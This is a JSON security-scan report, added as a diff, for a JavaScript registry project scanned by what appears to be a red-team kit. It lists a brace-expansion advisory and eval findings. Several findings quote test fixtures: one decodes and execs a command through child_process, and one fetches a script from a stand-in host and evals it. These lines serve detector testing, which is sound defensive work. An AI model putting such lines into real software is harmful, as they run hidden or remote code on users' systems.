@@ -1,0 +1,260 @@
+{
+  "generated_at": "2026-07-25T07:02:48.423168+00:00",
+  "mode": "repo",
+  "repo_root": "C:\\Users\\SuperAdmin\\.vscode\\aletheia-redteam-kit\\targets\\aletheia-registry",
+  "source": {
+    "kind": "local_path",
+    "value": "C:\\Users\\SuperAdmin\\.vscode\\aletheia-redteam-kit\\targets\\aletheia-registry"
+  },
+  "files_scanned": 23,
+  "secret_scan": {
+    "include_test_fixtures": false,
+    "excluded_globs": [
+      "tests/**",
+      "test/**"
+    ],
+    "allowlist_marker": "aletheia-redteam:allowed-test-fixture"
+  },
+  "enabled_scanners": [
+    "ci_config",
+    "dep_advisories",
+    "dep_hygiene",
+    "language_risks",
+    "secrets",
+    "threat_feed"
+  ],
+  "ignored_artifacts": [
+    "summary.json",
+    "summary_*.json",
+    "website_summary.json",
+    "report.md",
+    "runs/**"
+  ],
+  "dependencies": {
+    "scan_mode": "auto",
+    "manifests": {
+      "python": [],
+      "npm": [
+        "package-lock.json",
+        "package.json"
+      ],
+      "cargo": [],
+      "go": [],
+      "ruby": [],
+      "other": []
+    },
+    "tools": {
+      "pip_audit": {
+        "status": "not_run"
+      },
+      "osv_scanner": {
+        "status": "unavailable",
+        "reason": "binary_not_found"
+      },
+      "npm_audit": {
+        "status": "executed",
+        "exit_code": "1",
+        "source": "runtime_scan"
+      },
+      "cargo_audit": {
+        "status": "not_run"
+      }
+    },
+    "findings_total": 1,
+    "findings_by_severity": {
+      "CRITICAL": 0,
+      "HIGH": 1,
+      "MEDIUM": 0,
+      "LOW": 0
+    },
+    "findings_by_language": {
+      "javascript": 1
+    },
+    "reachability": {
+      "direct": 0,
+      "transitive": 0,
+      "unknown": 1
+    },
+    "exploitability_score": 8,
+    "top_packages": [
+      {
+        "name": "brace-expansion",
+        "advisory_ids": [
+          "brace-expansion"
+        ],
+        "languages": {
+          "javascript": 1
+        },
+        "reachability": {
+          "unknown": 1
+        },
+        "tools": {
+          "npm_audit": 1
+        },
+        "finding_types": {
+          "dependency_vulnerability": 1
+        },
+        "max_severity": "HIGH",
+        "advisory_count": 1
+      }
+    ],
+    "signals": {
+      "malware_suspect_total": 0,
+      "tampering_risk_total": 0,
+      "suspicious_package_total": 0,
+      "top_suspicious_packages": []
+    }
+  },
+  "extra_tools": {},
+  "findings_total": 7,
+  "findings_by_severity": {
+    "CRITICAL": 0,
+    "HIGH": 5,
+    "MEDIUM": 2,
+    "LOW": 0
+  },
+  "findings_by_type": {
+    "missing_ci_workflows": 1,
+    "missing_pyproject": 1,
+    "dependency_vulnerability": 1,
+    "javascript_eval": 4
+  },
+  "first_party_non_test_findings_total": 4,
+  "first_party_non_test_by_severity": {
+    "CRITICAL": 0,
+    "HIGH": 2,
+    "MEDIUM": 2,
+    "LOW": 0
+  },
+  "first_party_non_test_high_critical_count": 2,
+  "risk_score": 30,
+  "threat_feed": {
+    "source": "built_in",
+    "matches_total": 5,
+    "matches_by_type": {
+      "dependency_vulnerability": 1,
+      "javascript_eval": 4
+    }
+  },
+  "gates": {
+    "pass": true,
+    "violations": []
+  },
+  "findings": [
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "engine\\detector.js",
+      "line": 83,
+      "evidence": "'eval(',",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "dependency_vulnerability",
+      "title": "Dependency advisory: brace-expansion",
+      "file": "npm-audit",
+      "line": null,
+      "evidence": "brace-expansion: brace-expansion: DoS via unbounded expansion length causing an out-of-memory process crash",
+      "recommendation": "Upgrade brace-expansion to a secure version (<=5.0.7) and rerun npm audit.",
+      "threat_context": [
+        {
+          "threat": "Known vulnerable dependency",
+          "reference": "https://owasp.org/www-project-top-ten/"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "test\\behavior-tracker.test.js",
+      "line": 43,
+      "evidence": "\"const p = eval(atob(x)); require('child_process').execSync(p);\",",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "test\\behavior-tracker.test.js",
+      "line": 229,
+      "evidence": "['a.js', \"const payload = eval(atob(x));\"],",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "type": "javascript_eval",
+      "title": "JavaScript eval usage",
+      "file": "test\\behavior-tracker.test.js",
+      "line": 248,
+      "evidence": "\"fetch('https://cdn.example/a.js').then(r=>r.text()).then(t=>eval(t));\",",
+      "recommendation": "Remove eval and use safe parsing/dispatch mechanisms.",
+      "threat_context": [
+        {
+          "threat": "Code injection",
+          "reference": "https://owasp.org/www-community/attacks/Code_Injection"
+        }
+      ]
+    },
+    {
+      "severity": "MEDIUM",
+      "type": "missing_ci_workflows",
+      "title": "No CI workflows found",
+      "file": ".github/workflows",
+      "line": null,
+      "evidence": "workflow directory missing",
+      "recommendation": "Add CI workflows with security and regression gates."
+    },
+    {
+      "severity": "MEDIUM",
+      "type": "missing_pyproject",
+      "title": "Missing pyproject.toml",
+      "file": "pyproject.toml",
+      "line": null,
+      "evidence": "file not found",
+      "recommendation": "Define dependencies and build metadata in pyproject.toml."
+    }
+  ],
+  "scan_profile": "medium",
+  "gate_exceptions": {
+    "source": null,
+    "parse_error": null,
+    "invalid_entries": 0,
+    "applied": [],
+    "ignored_expired": [],
+    "remaining_violations": [],
+    "pass_with_exceptions": false
+  },
+  "baseline": {
+    "source": null,
+    "status": null,
+    "mode": null,
+    "active": false,
+    "approved_by": null,
+    "approved_at": null,
+    "expires_at": null,
+    "new_violations": [],
+    "resolved_violations": [],
+    "enforced_pass": false
+  }
+}
